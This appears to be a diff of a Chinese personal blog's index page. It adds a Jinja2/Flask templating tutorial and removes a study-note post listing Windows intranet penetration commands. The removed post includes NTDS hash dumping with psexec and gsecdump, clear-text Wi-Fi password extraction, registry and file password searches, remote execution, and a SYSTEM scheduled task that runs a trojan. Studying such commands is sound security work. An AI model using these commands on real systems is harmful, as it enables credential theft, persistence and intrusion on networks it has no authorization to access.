@@ -258,6 +258,308 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/28/python-jinja2模块学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/28/python-jinja2模块学习/" itemprop="url">
+                  python-jinja2模块学习
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-28T11:17:25+08:00">
+                2018-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/28/python-jinja2模块学习/" class="leancloud_visitors" data-flag-title="python-jinja2模块学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了python flask模板，flask模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体指只在请求的上下文中才能知道。使用真是只替换变量，再返回最终得到的响应字符串，这一过程称为渲染。为了渲染模板，Flask使用了一个名为Jinja2的强大模板引擎。这次记录一下jinja2模块的学习，用作笔记。</p>
+<h2 id="0x01-jinja2"><a href="#0x01-jinja2" class="headerlink" title="0x01 jinja2"></a>0x01 jinja2</h2><p>Jinja2是基于python的模板引擎，功能比较类似于于PHP的smarty，J2ee的Freemarker和velocity。 它能完全支持unicode，并具有集成的沙箱执行环境。jinja2使用BSD授权。起初是Flask作者模仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p>
+<h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>python库的安装都十分方便，jinja2也不例外，我们直接在命令行输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install jinja2</span><br></pre></td></tr></table></figure></p>
+<p>即可安装。</p>
+<h2 id="0x03-基本语法"><a href="#0x03-基本语法" class="headerlink" title="0x03 基本语法"></a>0x03 基本语法</h2><p>在jinja2中，存在三种语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x04-变量"><a href="#0x04-变量" class="headerlink" title="0x04 变量"></a>0x04 变量</h2><p>jinja2模板中使用两个花括号嵌套 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</p>
+<p>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;this is a dicectory:&#123;&#123; mydict[&apos;key&apos;] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a list:&#123;&#123; mylist[3] &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;this is a object:&#123;&#123; myobject.something() &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-过滤器"><a href="#0x05-过滤器" class="headerlink" title="0x05 过滤器"></a>0x05 过滤器</h2><p>花括号中的变量传输进来时，我们要对其进行一些对字符串的常规操作或者提升安全性的操作，这个时候可以使用jinja2自带的过滤器。</p>
+<p>常用的过滤器：</p>
+<table>
+<thead>
+<tr>
+<th>过滤器</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safe</td>
+<td>渲染时值不转义</td>
+</tr>
+<tr>
+<td>capitialize</td>
+<td>把值的首字母转换成大写，其他子母转换为小写</td>
+</tr>
+<tr>
+<td>lower</td>
+<td>把值转换成小写形式 </td>
+</tr>
+<tr>
+<td>upper</td>
+<td>把值转换成大写形式 </td>
+</tr>
+<tr>
+<td>title</td>
+<td>把值中每个单词的首字母都转换成大写</td>
+</tr>
+<tr>
+<td>trim</td>
+<td>把值的首尾空格去掉</td>
+</tr>
+<tr>
+<td>striptags</td>
+<td>渲染之前把值中所有的HTML标签都删掉</td>
+</tr>
+<tr>
+<td>join</td>
+<td>拼接多个值为字符串</td>
+</tr>
+<tr>
+<td>replace</td>
+<td>替换字符串的值</td>
+</tr>
+<tr>
+<td>round</td>
+<td>默认对数字进行四舍五入，也可以用参数进行控制</td>
+</tr>
+<tr>
+<td>int</td>
+<td>把值转换成整型</td>
+</tr>
+</tbody>
+</table>
+<p>过滤器的用法是在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;abc&apos; | upper  &#125;&#125;</span><br><span class="line"># ABC</span><br><span class="line">&#123;&#123; &apos;hello world&apos; | title  &#125;&#125;</span><br><span class="line"># Hello World</span><br><span class="line">&#123;&#123; 18.18 | round | int &#125;&#125;</span><br><span class="line"># 18</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-分支"><a href="#0x06-分支" class="headerlink" title="0x06 分支"></a>0x06 分支</h2><p>jinja2中的if语句类似与Python的if语句，它也具有单分支，多分支等多种结构，不同的是，条件语句不需要使用冒号结尾，而结束控制语句，需要使用endif关键字。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if grade&gt;=90 %&#125;</span><br><span class="line">excellent</span><br><span class="line">&#123;% elif grade&gt;=60 %&#125;</span><br><span class="line">great</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">bad</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07-循环"><a href="#0x07-循环" class="headerlink" title="0x07 循环"></a>0x07 循环</h2><p>jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。</p>
+<p>迭代列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&lt;li&gt;&#123;&#123; user.username|title &#125;&#125;&lt;/li&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p>
+<p>迭代字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt;</span><br><span class="line">&#123;% for key, value in my_dict.iteritems() %&#125;</span><br><span class="line">&lt;dt&gt;&#123;&#123; key &#125;&#125;&lt;/dt&gt;</span><br><span class="line">&lt;dd&gt;&#123;&#123; value&#125;&#125;&lt;/dd&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在for循环中，jinja2还提供了一些特殊的变量，用以来获取当前的遍历状态：</p>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>loop.index</td>
+<td>当前迭代的索引（从1开始）</td>
+</tr>
+<tr>
+<td>loop.index0</td>
+<td>当前迭代的索引（从0开始）</td>
+</tr>
+<tr>
+<td>loop.first</td>
+<td>是否是第一次迭代，返回bool</td>
+</tr>
+<tr>
+<td>loop.last</td>
+<td>是否是最后一次迭代，返回bool</td>
+</tr>
+<tr>
+<td>loop.length</td>
+<td>序列中的项目数量</td>
+</tr>
+<tr>
+<td>loop.revindex</td>
+<td>到循环结束的次数（从1开始）</td>
+</tr>
+<tr>
+<td>loop.revindex0</td>
+<td>到循环结束的次数(从0开始）</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x08-宏"><a href="#0x08-宏" class="headerlink" title="0x08 宏"></a>0x08 宏</h2><p>宏类似于Python中的函数（其实就是函数的用法），我们在宏中定义行为，还可以进行传递参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name,age=18) %&#125;</span><br><span class="line"> &lt;input type=&apos;text&apos; name=&quot;&#123;&#123; name &#125;&#125;&quot; value=&quot;&#123;&#123; age &#125;&#125;&quot; &gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure>
+<p>调用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;) &#125;&#125; &lt;/p&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; input(&apos;daxin&apos;,age=20) &#125;&#125; &lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-继承"><a href="#0x09-继承" class="headerlink" title="0x09 继承"></a>0x09 继承</h2><p>jinja2中最强大的部分就是模板继承。模板继承允许我们创建一个基本文件，其他文件从该骨架文件继承，然后针对自己需要的地方进行修改。</p>
+<p>骨架文件中，block关键字表示其包涵的内容可以进行修改。</p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&#123;% block title %&#125;Leticia&apos;s Blog&#123;% endblock %&#125;&lt;/title&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们要替换的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block title %&#125;xxx&apos;s Blog&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-渲染模板"><a href="#0x10-渲染模板" class="headerlink" title="0x10 渲染模板"></a>0x10 渲染模板</h2><p>默认情况下，Flask在程序文件夹中的templates子文件夹中寻找模板。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import jinja2</span><br><span class="line">from flask import Flask, render_template</span><br><span class="line"></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/&apos;)</span><br><span class="line">    def index():</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/user/&lt;name&gt;&apos;)</span><br><span class="line">    def user(name):</span><br><span class="line">        return render_template(&apos;user.html&apos;, name=name)</span><br></pre></td></tr></table></figure></p>
+<p>render_template 函数的第一个参数是模板的文件名（index.html，user.html），随后的参数都是键值对（name=name），表示模板中变量的真实值。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/25/python-flask模块学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2310,185 +2612,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/05/内网渗透常用命令总结（windows）/" itemprop="url">
-                  内网渗透常用命令总结（windows）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-05T21:55:03+08:00">
-                2018-05-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/05/内网渗透常用命令总结（windows）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（windows）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p>
-<h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                        //获得所有域用户组列表 </span><br><span class="line">net group qq_group /domain               //显示域中qq_group组的成员 </span><br><span class="line">net group qq_group /del /domain          //删除域中qq_group组</span><br><span class="line">net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ</span><br><span class="line">net group qq_group /add /domain          //增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot;  /domain       //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain    //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot;  /domain   //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot;  /domain    //获得所有域成员计算机列表</span><br><span class="line">net user /domain                        //获得所有域用户列表</span><br><span class="line">net user someuser /domain              //获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nei view /domain                   //查询有几个域, 查询域列表</span><br><span class="line">net view /domain:testdomain       //查看 testdomain域中的计算机列表</span><br><span class="line">nltest /domain_trusts              //获取域信任信息</span><br><span class="line">net user domain-admin /domain      //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation         //查询机器属于哪个域</span><br><span class="line">net time /domian               //查询主域服务器的时间</span><br><span class="line">echo %logonserver%              //查看登陆到这台服务器的计算机名</span><br><span class="line">net time  \\192.168.1.1         //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\IP\ipc$ password /user:username@domain     //ipc$域内连接</span><br><span class="line">net  view  \\dc2.backlion.com         //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录</span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt  sysvol.txt  /i  /e  /c //远程拷贝到本地sysvol日志</span><br><span class="line">net user  /domain  bk  bk123                 //修改域内用户密码，需要管理员权限</span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add      //将SEZKL域中的用户backlion添加到administrators组中</span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题</span><br><span class="line">gpupdate/force                  //更新域策略</span><br><span class="line">psexec  \\192.168.1.3  -u  administrator  -p  bk1234  -c  gsecdump.exe  -u</span><br><span class="line">  //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</span><br><span class="line">gsecdump  -a        //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</span><br><span class="line">tasklist /S ip /U domain\username /P /V     //查看远程计算机进程列</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-基本命令"><a href="#0x02-基本命令" class="headerlink" title="0x02 基本命令"></a>0x02 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all    //查看IP地址</span><br><span class="line">ipconfig /release  //释放地址</span><br><span class="line">ipconfig /renew 重新获取Ip地址</span><br><span class="line">whoami    //查询账号所属权限</span><br><span class="line">whoami/all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc   //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe  get hotfixid    //查看已安装过得补丁，这个很实用</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm  //详细的补丁安装</span><br><span class="line">wmic  qfe      //查询补丁信息以及微软提供的下载地址</span><br><span class="line">ping hostname(主机名）   //显示该机器名的IP </span><br><span class="line">net start   //查看当前运行的服务</span><br><span class="line">net user      //查看本地组的用户</span><br><span class="line">net localhroup administrators   //查看本机管理员组有哪些用户</span><br><span class="line">net use      //查看会话</span><br><span class="line">net session     //查看当前会话</span><br><span class="line">net share       //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式）</span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘</span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是</span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行</span><br><span class="line">netstat  -ano      //查看开放的端口</span><br><span class="line">netstat -an | find “3389”   //找到3389端口</span><br><span class="line">net accounts      //查看本地密码策略</span><br><span class="line">nbtstat –A ip      //netbiso查询</span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%         //查看系统是32还是64位  </span><br><span class="line">set                              //查看系统环境设置变量</span><br><span class="line">net start                     //查看当前运行的服务</span><br><span class="line">wmic service list brief              //查看进程服务</span><br><span class="line">wmic process list brief         //查看进程</span><br><span class="line">wmic startup list brief       //查看启动程序信息</span><br><span class="line">wmic product list brief            //查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full         //识别开机启动的程序</span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log  //获取软件安装路径</span><br><span class="line"></span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan show profiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br><span class="line"> //一键获取wifi密码</span><br><span class="line"></span><br><span class="line"> if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) </span><br><span class="line">//查看是否支持posershell</span><br><span class="line"></span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line"></span><br><span class="line">schtasks.exe  /Create /RU &quot;SYSTEM&quot; /SC MINUTE /MO 45 /TN FIREWALL /TR &quot;c:/muma.ex    e&quot; /ED 2017/4/7  //添加计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f /q /a a.txt</span><br><span class="line"> //windows未打补丁情况</span><br><span class="line"></span><br><span class="line"> REG query HKCU  /v &quot;pwd&quot; /s  //获取保存到注册表中的密码</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-内网网络结构"><a href="#0x03-内网网络结构" class="headerlink" title=" 0x03 内网网络结构"></a> 0x03 内网网络结构</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> tracert IP    //路由跟踪</span><br><span class="line">route print    //打印路由表</span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s （ip + mac）//绑定mac与ip地址</span><br><span class="line">arp -d （ip + mac） //解绑mac与ip地址</span><br><span class="line">nbtscan -r 192.168.16.0/24      //通过小工具nbtscan扫描整个网络</span><br><span class="line">netsh firewall show config     //查看防火墙策略</span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;   //批量扫描内网存活主机</span><br><span class="line"></span><br><span class="line">windows自带端口转发：</span><br><span class="line">netsh interface ipv6 install  //首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22 connectaddress=1.1.1.1 connectport=22  //将本机22到1.1.1.1的22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=8.8.8.8 connectport=22</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.193.1 listenport=22 connectaddress=www.baidu.com connectport=22</span><br><span class="line">netsh interface portproxy show all // 查看转发配置</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=22 //删除配置</span><br><span class="line">netsh firewall set portopening protocol=tcp port=22 name=Forward mode=enable scope=all profile=all  //添加防火墙规则，允许连接22：</span><br></pre></td></tr></table></figure>
-<p>0x04 敏感数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s config.*              //查看所在目录所有config.为前缀的文件</span><br><span class="line">findstr /si password *.xml *.ini *.txt     //查看后缀名文件中含有password关键字的文件</span><br><span class="line">findstr /si login *.xml *.ini *.txt     //查看后缀名文件中含有login关键字的文件</span><br><span class="line">copy con 创建命令：</span><br><span class="line">copy con  ftp.bat     //创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</span><br><span class="line">copy con  test.vbs    //创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</span><br></pre></td></tr></table></figure></p>
